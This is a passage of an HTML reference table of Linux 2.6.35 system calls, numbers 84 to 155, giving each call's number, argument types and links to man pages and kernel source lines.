href="http://lxr.free-electrons.com/source/fs/namei.c?v=2.6.35#L2419" target="_blank" rel="noopener">fs/namei.c:2419</a></td></tr><tr><td>84</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/lstat.2.html" target="_blank" rel="noopener">sys_lstat</a></td><td>0x54</td><td>char __user *filename</td><td><a href="http://lxr.free-electrons.com/source/arch/arm/include/asm/stat.h?v=2.6.35#L4" target="_blank" rel="noopener">struct __old_kernel_stat __user *statbuf</a></td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/stat.c?v=2.6.35#L162" target="_blank" rel="noopener">fs/stat.c:162</a></td></tr><tr><td>85</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/readlink.2.html" target="_blank" rel="noopener">sys_readlink</a></td><td>0x55</td><td>const char __user *path</td><td>char __user *buf</td><td>int bufsiz</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/stat.c?v=2.6.35#L311" target="_blank" rel="noopener">fs/stat.c:311</a></td></tr><tr><td>86</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/uselib.2.html" target="_blank" rel="noopener">sys_uselib</a></td><td>0x56</td><td>const char __user *library</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/exec.c?v=2.6.35#L107" target="_blank" rel="noopener">fs/exec.c:107</a></td></tr><tr><td>87</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/swapon.2.html" target="_blank" rel="noopener">sys_swapon</a></td><td>0x57</td><td>const char __user *specialfile</td><td>int swap_flags</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/mm/swapfile.c?v=2.6.35#L1793" target="_blank" rel="noopener">mm/swapfile.c:1793</a></td></tr><tr><td>88</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/reboot.2.html" target="_blank" rel="noopener">sys_reboot</a></td><td>0x58</td><td>int magic1</td><td>int magic2</td><td>unsigned int cmd</td><td>void __user *arg</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L368" target="_blank" rel="noopener">kernel/sys.c:368</a></td></tr><tr><td>89</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/old_readdir.2.html" target="_blank" rel="noopener">sys_old_readdir</a></td><td>0x59</td><td>unsigned int</td><td><a href="http://lxr.free-electrons.com/source/fs/readdir.c?v=2.6.35#L61" target="_blank" rel="noopener">struct old_linux_dirent __user *</a></td><td>unsigned int</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/readdir.c?v=2.6.35#L105" target="_blank" rel="noopener">fs/readdir.c:105</a></td></tr><tr><td>90</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/old_mmap.2.html" target="_blank" rel="noopener">sys_old_mmap</a></td><td>0x5a</td><td><a href="http://lxr.free-electrons.com/source/mm/mmap.c?v=2.6.35#L1132" target="_blank" rel="noopener">struct mmap_arg_struct __user *arg</a></td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/mm/mmap.c?v=2.6.35#L1141" target="_blank" rel="noopener">mm/mmap.c:1141</a></td></tr><tr><td>91</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/munmap.2.html" target="_blank" rel="noopener">sys_munmap</a></td><td>0x5b</td><td>unsigned long addr</td><td>size_t len</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/mm/mmap.c?v=2.6.35#L2109" target="_blank" rel="noopener">mm/mmap.c:2109</a></td></tr><tr><td>92</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/truncate.2.html" target="_blank" rel="noopener">sys_truncate</a></td><td>0x5c</td><td>const char __user *path</td><td>long length</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/open.c?v=2.6.35#L127" target="_blank" rel="noopener">fs/open.c:127</a></td></tr><tr><td>93</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/ftruncate.2.html" target="_blank" rel="noopener">sys_ftruncate</a></td><td>0x5d</td><td>unsigned int fd</td><td>unsigned long length</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/open.c?v=2.6.35#L178" target="_blank" rel="noopener">fs/open.c:178</a></td></tr><tr><td>94</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fchmod.2.html" target="_blank" rel="noopener">sys_fchmod</a></td><td>0x5e</td><td>unsigned int fd</td><td>mode_t mode</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/open.c?v=2.6.35#L436" target="_blank" rel="noopener">fs/open.c:436</a></td></tr><tr><td>95</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fchown16.2.html" target="_blank" rel="noopener">sys_fchown16</a></td><td>0x5f</td><td>unsigned int fd</td><td>old_uid_t user</td><td>old_gid_t group</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/uid16.c?v=2.6.35#L35" target="_blank" rel="noopener">kernel/uid16.c:35</a></td></tr><tr><td>96</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getpriority.2.html" target="_blank" rel="noopener">sys_getpriority</a></td><td>0x60</td><td>int which</td><td>int who</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L216" target="_blank" rel="noopener">kernel/sys.c:216</a></td></tr><tr><td>97</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setpriority.2.html" target="_blank" rel="noopener">sys_setpriority</a></td><td>0x61</td><td>int which</td><td>int who</td><td>int niceval</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L149" target="_blank" rel="noopener">kernel/sys.c:149</a></td></tr><tr><td>98</td><td>not implemented</td><td>0x62</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td></td></tr><tr><td>99</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/statfs.2.html" target="_blank" rel="noopener">sys_statfs</a></td><td>0x63</td><td>const char __user * path</td><td><a href="http://lxr.free-electrons.com/source/arch/mips/include/asm/statfs.h?v=2.6.35#L22" target="_blank" rel="noopener">struct statfs __user *buf</a></td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/statfs.c?v=2.6.35#L102" target="_blank" rel="noopener">fs/statfs.c:102</a></td></tr><tr><td>100</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fstatfs.2.html" target="_blank" rel="noopener">sys_fstatfs</a></td><td>0x64</td><td>unsigned int fd</td><td><a href="http://lxr.free-electrons.com/source/arch/mips/include/asm/statfs.h?v=2.6.35#L22" target="_blank" rel="noopener">struct statfs __user *buf</a></td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/statfs.c?v=2.6.35#L136" target="_blank" rel="noopener">fs/statfs.c:136</a></td></tr><tr><td>101</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/ioperm.2.html" target="_blank" rel="noopener">sys_ioperm</a></td><td>0x65</td><td>unsigned long</td><td>unsigned long</td><td>int</td><td>-</td><td>-</td><td>[not found:](<a href="http://lxr.free-electrons.com/source/not" target="_blank" rel="noopener">http://lxr.free-electrons.com/source/not</a> found?v=2.6.35#L)</td></tr><tr><td>102</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/socketcall.2.html" target="_blank" rel="noopener">sys_socketcall</a></td><td>0x66</td><td>int call</td><td>unsigned long __user *args</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/net/socket.c?v=2.6.35#L2210" target="_blank" rel="noopener">net/socket.c:2210</a></td></tr><tr><td>103</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/syslog.2.html" target="_blank" rel="noopener">sys_syslog</a></td><td>0x67</td><td>int type</td><td>char __user *buf</td><td>int len</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/printk.c?v=2.6.35#L412" target="_blank" rel="noopener">kernel/printk.c:412</a></td></tr><tr><td>104</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setitimer.2.html" target="_blank" rel="noopener">sys_setitimer</a></td><td>0x68</td><td>int which</td><td><a href="http://lxr.free-electrons.com/source/include/linux/time.h?v=2.6.35#L263" target="_blank" rel="noopener">struct itimerval __user *value</a></td><td><a href="http://lxr.free-electrons.com/source/include/linux/time.h?v=2.6.35#L263" target="_blank" rel="noopener">struct itimerval __user *ovalue</a></td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/itimer.c?v=2.6.35#L279" target="_blank" rel="noopener">kernel/itimer.c:279</a></td></tr><tr><td>105</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getitimer.2.html" target="_blank" rel="noopener">sys_getitimer</a></td><td>0x69</td><td>int which</td><td><a href="http://lxr.free-electrons.com/source/include/linux/time.h?v=2.6.35#L263" target="_blank" rel="noopener">struct itimerval __user *value</a></td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/itimer.c?v=2.6.35#L103" target="_blank" rel="noopener">kernel/itimer.c:103</a></td></tr><tr><td>106</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/newstat.2.html" target="_blank" rel="noopener">sys_newstat</a></td><td>0x6a</td><td>char __user *filename</td><td><a href="http://lxr.free-electrons.com/source/arch/alpha/include/asm/stat.h?v=2.6.35#L4" target="_blank" rel="noopener">struct stat __user *statbuf</a></td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/stat.c?v=2.6.35#L237" target="_blank" rel="noopener">fs/stat.c:237</a></td></tr><tr><td>107</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/newlstat.2.html" target="_blank" rel="noopener">sys_newlstat</a></td><td>0x6b</td><td>char __user *filename</td><td><a href="http://lxr.free-electrons.com/source/arch/alpha/include/asm/stat.h?v=2.6.35#L4" target="_blank" rel="noopener">struct stat __user *statbuf</a></td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/stat.c?v=2.6.35#L247" target="_blank" rel="noopener">fs/stat.c:247</a></td></tr><tr><td>108</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/newfstat.2.html" target="_blank" rel="noopener">sys_newfstat</a></td><td>0x6c</td><td>unsigned int fd</td><td><a href="http://lxr.free-electrons.com/source/arch/alpha/include/asm/stat.h?v=2.6.35#L4" target="_blank" rel="noopener">struct stat __user *statbuf</a></td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/stat.c?v=2.6.35#L273" target="_blank" rel="noopener">fs/stat.c:273</a></td></tr><tr><td>109</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/uname.2.html" target="_blank" rel="noopener">sys_uname</a></td><td>0x6d</td><td><a href="http://lxr.free-electrons.com/source/include/linux/utsname.h?v=2.6.35#L16" target="_blank" rel="noopener">struct old_utsname __user *</a></td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L1115" target="_blank" rel="noopener">kernel/sys.c:1115</a></td></tr><tr><td>110</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/iopl.2.html" target="_blank" rel="noopener">sys_iopl</a></td><td>0x6e</td><td>unsigned int</td><td><a href="http://lxr.free-electrons.com/source/arch/alpha/include/asm/ptrace.h?v=2.6.35#L19" target="_blank" rel="noopener">struct pt_regs *</a></td><td>-</td><td>-</td><td>-</td><td>[not found:](<a href="http://lxr.free-electrons.com/source/not" target="_blank" rel="noopener">http://lxr.free-electrons.com/source/not</a> found?v=2.6.35#L)</td></tr><tr><td>111</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/vhangup.2.html" target="_blank" rel="noopener">sys_vhangup</a></td><td>0x6f</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/open.c?v=2.6.35#L1008" target="_blank" rel="noopener">fs/open.c:1008</a></td></tr><tr><td>112</td><td>not implemented</td><td>0x70</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td></td></tr><tr><td>113</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/vm86old.2.html" target="_blank" rel="noopener">sys_vm86old</a></td><td>0x71</td><td><a href="http://lxr.free-electrons.com/source/arch/x86/include/asm/vm86.h?v=2.6.35#L96" target="_blank" rel="noopener">struct vm86_struct __user *</a></td><td><a href="http://lxr.free-electrons.com/source/arch/alpha/include/asm/ptrace.h?v=2.6.35#L19" target="_blank" rel="noopener">struct pt_regs *</a></td><td>-</td><td>-</td><td>-</td><td>[not found:](<a href="http://lxr.free-electrons.com/source/not" target="_blank" rel="noopener">http://lxr.free-electrons.com/source/not</a> found?v=2.6.35#L)</td></tr><tr><td>114</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/wait4.2.html" target="_blank" rel="noopener">sys_wait4</a></td><td>0x72</td><td>pid_t pid</td><td>int __user *stat_addr</td><td>int options</td><td><a href="http://lxr.free-electrons.com/source/include/linux/resource.h?v=2.6.35#L22" target="_blank" rel="noopener">struct rusage __user *ru</a></td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/exit.c?v=2.6.35#L1726" target="_blank" rel="noopener">kernel/exit.c:1726</a></td></tr><tr><td>115</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/swapoff.2.html" target="_blank" rel="noopener">sys_swapoff</a></td><td>0x73</td><td>const char __user *specialfile</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/mm/swapfile.c?v=2.6.35#L1533" target="_blank" rel="noopener">mm/swapfile.c:1533</a></td></tr><tr><td>116</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sysinfo.2.html" target="_blank" rel="noopener">sys_sysinfo</a></td><td>0x74</td><td>struct sysinfo __user *info</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/timer.c?v=2.6.35#L1565" target="_blank" rel="noopener">kernel/timer.c:1565</a></td></tr><tr><td>117</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/ipc.2.html" target="_blank" rel="noopener">sys_ipc</a></td><td>0x75</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/ipc/syscall.c?v=2.6.35#L16" target="_blank" rel="noopener">ipc/syscall.c:16</a></td></tr><tr><td>118</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fsync.2.html" target="_blank" rel="noopener">sys_fsync</a></td><td>0x76</td><td>unsigned int fd</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/sync.c?v=2.6.35#L221" target="_blank" rel="noopener">fs/sync.c:221</a></td></tr><tr><td>119</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sigreturn.2.html" target="_blank" rel="noopener">sys_sigreturn</a></td><td>0x77</td><td><a href="http://lxr.free-electrons.com/source/arch/alpha/include/asm/ptrace.h?v=2.6.35#L19" target="_blank" rel="noopener">struct pt_regs *regs</a></td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/arch/alpha/kernel/entry.S?v=2.6.35#L758" target="_blank" rel="noopener">arch/alpha/kernel/entry.S:758</a></td></tr><tr><td>120</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/clone.2.html" target="_blank" rel="noopener">sys_clone</a></td><td>0x78</td><td>unsigned long</td><td>unsigned long</td><td>unsigned long</td><td>unsigned long</td><td><a href="http://lxr.free-electrons.com/source/arch/alpha/include/asm/ptrace.h?v=2.6.35#L19" target="_blank" rel="noopener">struct pt_regs *</a></td><td><a href="http://lxr.free-electrons.com/source/arch/alpha/kernel/entry.S?v=2.6.35#L733" target="_blank" rel="noopener">arch/alpha/kernel/entry.S:733</a></td></tr><tr><td>121</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setdomainname.2.html" target="_blank" rel="noopener">sys_setdomainname</a></td><td>0x79</td><td>char __user *name</td><td>int len</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L1214" target="_blank" rel="noopener">kernel/sys.c:1214</a></td></tr><tr><td>122</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/newuname.2.html" target="_blank" rel="noopener">sys_newuname</a></td><td>0x7a</td><td><a href="http://lxr.free-electrons.com/source/include/linux/utsname.h?v=2.6.35#L24" target="_blank" rel="noopener">struct new_utsname __user *name</a></td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L1097" target="_blank" rel="noopener">kernel/sys.c:1097</a></td></tr><tr><td>123</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/modify_ldt.2.html" target="_blank" rel="noopener">sys_modify_ldt</a></td><td>0x7b</td><td>int</td><td>void __user *</td><td>unsigned long</td><td>-</td><td>-</td><td>[not found:](<a href="http://lxr.free-electrons.com/source/not" target="_blank" rel="noopener">http://lxr.free-electrons.com/source/not</a> found?v=2.6.35#L)</td></tr><tr><td>124</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/adjtimex.2.html" target="_blank" rel="noopener">sys_adjtimex</a></td><td>0x7c</td><td><a href="http://lxr.free-electrons.com/source/include/linux/timex.h?v=2.6.35#L64" target="_blank" rel="noopener">struct timex __user *txc_p</a></td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/time.c?v=2.6.35#L206" target="_blank" rel="noopener">kernel/time.c:206</a></td></tr><tr><td>125</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mprotect.2.html" target="_blank" rel="noopener">sys_mprotect</a></td><td>0x7d</td><td>unsigned long start</td><td>size_t len</td><td>unsigned long prot</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/mm/mprotect.c?v=2.6.35#L221" target="_blank" rel="noopener">mm/mprotect.c:221</a></td></tr><tr><td>126</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sigprocmask.2.html" target="_blank" rel="noopener">sys_sigprocmask</a></td><td>0x7e</td><td>int how</td><td>old_sigset_t __user *set</td><td>old_sigset_t __user *oset</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/signal.c?v=2.6.35#L2573" target="_blank" rel="noopener">kernel/signal.c:2573</a></td></tr><tr><td>127</td><td>not implemented</td><td>0x7f</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td></td></tr><tr><td>128</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/init_module.2.html" target="_blank" rel="noopener">sys_init_module</a></td><td>0x80</td><td>void __user *umod</td><td>unsigned long len</td><td>const char __user *uargs</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/module.c?v=2.6.35#L2611" target="_blank" rel="noopener">kernel/module.c:2611</a></td></tr><tr><td>129</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/delete_module.2.html" target="_blank" rel="noopener">sys_delete_module</a></td><td>0x81</td><td>const char __user *name_user</td><td>unsigned int flags</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/module.c?v=2.6.35#L720" target="_blank" rel="noopener">kernel/module.c:720</a></td></tr><tr><td>130</td><td>not implemented</td><td>0x82</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td></td></tr><tr><td>131</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/quotactl.2.html" target="_blank" rel="noopener">sys_quotactl</a></td><td>0x83</td><td>unsigned int cmd</td><td>const char __user *special</td><td>qid_t id</td><td>void __user *addr</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/quota/quota.c?v=2.6.35#L333" target="_blank" rel="noopener">fs/quota/quota.c:333</a></td></tr><tr><td>132</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getpgid.2.html" target="_blank" rel="noopener">sys_getpgid</a></td><td>0x84</td><td>pid_t pid</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L990" target="_blank" rel="noopener">kernel/sys.c:990</a></td></tr><tr><td>133</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fchdir.2.html" target="_blank" rel="noopener">sys_fchdir</a></td><td>0x85</td><td>unsigned int fd</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/open.c?v=2.6.35#L382" target="_blank" rel="noopener">fs/open.c:382</a></td></tr><tr><td>134</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/bdflush.2.html" target="_blank" rel="noopener">sys_bdflush</a></td><td>0x86</td><td>int func</td><td>long data</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/buffer.c?v=2.6.35#L3278" target="_blank" rel="noopener">fs/buffer.c:3278</a></td></tr><tr><td>135</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sysfs.2.html" target="_blank" rel="noopener">sys_sysfs</a></td><td>0x87</td><td>int option</td><td>unsigned long arg1</td><td>unsigned long arg2</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/filesystems.c?v=2.6.35#L182" target="_blank" rel="noopener">fs/filesystems.c:182</a></td></tr><tr><td>136</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/personality.2.html" target="_blank" rel="noopener">sys_personality</a></td><td>0x88</td><td>unsigned int personality</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/exec_domain.c?v=2.6.35#L191" target="_blank" rel="noopener">kernel/exec_domain.c:191</a></td></tr><tr><td>137</td><td>not implemented</td><td>0x89</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td></td></tr><tr><td>138</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setfsuid16.2.html" target="_blank" rel="noopener">sys_setfsuid16</a></td><td>0x8a</td><td>old_uid_t uid</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/uid16.c?v=2.6.35#L118" target="_blank" rel="noopener">kernel/uid16.c:118</a></td></tr><tr><td>139</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setfsgid16.2.html" target="_blank" rel="noopener">sys_setfsgid16</a></td><td>0x8b</td><td>old_gid_t gid</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/uid16.c?v=2.6.35#L126" target="_blank" rel="noopener">kernel/uid16.c:126</a></td></tr><tr><td>140</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/llseek.2.html" target="_blank" rel="noopener">sys_llseek</a></td><td>0x8c</td><td>unsigned int fd</td><td>unsigned long offset_high</td><td>unsigned long offset_low</td><td>loff_t __user *result</td><td>unsigned int origin</td><td><a href="http://lxr.free-electrons.com/source/fs/read_write.c?v=2.6.35#L191" target="_blank" rel="noopener">fs/read_write.c:191</a></td></tr><tr><td>141</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getdents.2.html" target="_blank" rel="noopener">sys_getdents</a></td><td>0x8d</td><td>unsigned int fd</td><td><a href="http://lxr.free-electrons.com/source/fs/readdir.c?v=2.6.35#L135" target="_blank" rel="noopener">struct linux_dirent __user *dirent</a></td><td>unsigned int count</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/readdir.c?v=2.6.35#L191" target="_blank" rel="noopener">fs/readdir.c:191</a></td></tr><tr><td>142</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/select.2.html" target="_blank" rel="noopener">sys_select</a></td><td>0x8e</td><td>int n</td><td>fd_set __user *inp</td><td>fd_set __user *outp</td><td>fd_set __user *exp</td><td><a href="http://lxr.free-electrons.com/source/include/linux/time.h?v=2.6.35#L20" target="_blank" rel="noopener">struct timeval __user *tvp</a></td><td><a href="http://lxr.free-electrons.com/source/fs/select.c?v=2.6.35#L596" target="_blank" rel="noopener">fs/select.c:596</a></td></tr><tr><td>143</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/flock.2.html" target="_blank" rel="noopener">sys_flock</a></td><td>0x8f</td><td>unsigned int fd</td><td>unsigned int cmd</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/locks.c?v=2.6.35#L1569" target="_blank" rel="noopener">fs/locks.c:1569</a></td></tr><tr><td>144</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/msync.2.html" target="_blank" rel="noopener">sys_msync</a></td><td>0x90</td><td>unsigned long start</td><td>size_t len</td><td>int flags</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/mm/msync.c?v=2.6.35#L31" target="_blank" rel="noopener">mm/msync.c:31</a></td></tr><tr><td>145</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/readv.2.html" target="_blank" rel="noopener">sys_readv</a></td><td>0x91</td><td>unsigned long fd</td><td>const struct iovec __user *vec</td><td>unsigned long vlen</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/read_write.c?v=2.6.35#L711" target="_blank" rel="noopener">fs/read_write.c:711</a></td></tr><tr><td>146</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/writev.2.html" target="_blank" rel="noopener">sys_writev</a></td><td>0x92</td><td>unsigned long fd</td><td>const struct iovec __user *vec</td><td>unsigned long vlen</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/read_write.c?v=2.6.35#L732" target="_blank" rel="noopener">fs/read_write.c:732</a></td></tr><tr><td>147</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getsid.2.html" target="_blank" rel="noopener">sys_getsid</a></td><td>0x93</td><td>pid_t pid</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L1027" target="_blank" rel="noopener">kernel/sys.c:1027</a></td></tr><tr><td>148</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fdatasync.2.html" target="_blank" rel="noopener">sys_fdatasync</a></td><td>0x94</td><td>unsigned int fd</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/sync.c?v=2.6.35#L226" target="_blank" rel="noopener">fs/sync.c:226</a></td></tr><tr><td>149</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sysctl.2.html" target="_blank" rel="noopener">sys_sysctl</a></td><td>0x95</td><td><a href="http://lxr.free-electrons.com/source/include/linux/sysctl.h?v=2.6.35#L36" target="_blank" rel="noopener">struct __sysctl_args __user *args</a></td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sysctl_binary.c?v=2.6.35#L1462" target="_blank" rel="noopener">kernel/sysctl_binary.c:1462</a></td></tr><tr><td>150</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mlock.2.html" target="_blank" rel="noopener">sys_mlock</a></td><td>0x96</td><td>unsigned long start</td><td>size_t len</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/mm/mlock.c?v=2.6.35#L491" target="_blank" rel="noopener">mm/mlock.c:491</a></td></tr><tr><td>151</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/munlock.2.html" target="_blank" rel="noopener">sys_munlock</a></td><td>0x97</td><td>unsigned long start</td><td>size_t len</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/mm/mlock.c?v=2.6.35#L519" target="_blank" rel="noopener">mm/mlock.c:519</a></td></tr><tr><td>152</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mlockall.2.html" target="_blank" rel="noopener">sys_mlockall</a></td><td>0x98</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/mm/mlock.c?v=2.6.35#L556" target="_blank" rel="noopener">mm/mlock.c:556</a></td></tr><tr><td>153</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/munlockall.2.html" target="_blank" rel="noopener">sys_munlockall</a></td><td>0x99</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/mm/mlock.c?v=2.6.35#L584" target="_blank" rel="noopener">mm/mlock.c:584</a></td></tr><tr><td>154</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sched_setparam.2.html" target="_blank" rel="noopener">sys_sched_setparam</a></td><td>0x9a</td><td>pid_t pid</td><td><a href="http://lxr.free-electrons.com/source/include/linux/sched.h?v=2.6.35#L46" target="_blank" rel="noopener">struct sched_param __user *param</a></td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sched.c?v=2.6.35#L4616" target="_blank" rel="noopener">kernel/sched.c:4616</a></td></tr><tr><td>155</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sched_getparam.2.html" target="_blank" rel="noopener">sys_sched_getparam</a></td><td>0x9b</td><td>pid_t pid</td><td><a href="http://lxr.free-electrons.com/source/include/linux/sched.h?v=2.6.35#L46" target="_blank" rel="noopener">struct sched_param __user *param</a></td><td>-</td><td>-</td><td>-</td><td><a 